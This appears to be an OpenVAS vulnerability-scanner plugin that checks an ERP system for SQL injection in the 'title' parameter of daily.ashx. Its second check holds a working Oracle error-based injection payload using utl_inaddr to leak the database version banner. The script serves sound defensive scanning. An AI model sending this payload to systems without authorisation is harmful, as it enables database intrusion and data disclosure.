##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_entrps_resrce_plan_sql_inj_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# ERP (Enterprise Resource Planning) System SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803137");
  script_version("$Revision: 11374 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-12-31 13:34:48 +0530 (Mon, 31 Dec 2012)");
  script_name("ERP (Enterprise Resource Planning) System SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/119157/erp-sql.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to compromise
  the application, access or modify data or exploit vulnerabilities in the
  underlying database.");
  script_tag(name:"affected", value:"ERP Enterprise Resource Planning");
  script_tag(name:"insight", value:"Improper validation of user-supplied input passed via the 'title'
  parameter to '/Portal/WUC/daily.ashx', which allows attacker to  manipulate SQL
  queries by injecting arbitrary SQL code.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is installed with Enterprise Resource Planning and is
  prone to SQL injection vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir(make_list_unique("/", "/erp", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  url = dir + "/";

  if(http_vuln_check(port: port, url: url, check_header: TRUE,
                     pattern: ">  erp  <"))
  {
    url = dir +  "/Portal/WUC/daily.ashx?title='or%201=utl_inaddr." +
          "get_host_address((select%20banner%20from%20v$version%20" +
          "where%20rownum=1))--";

    if(http_vuln_check(port:port, url:url, pattern:'SYS.UTL_INADDR',
     extra_check: make_list("Oracle Database", "SYS.UTL_INADDR",
                            "daily.ProcessRequest")))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
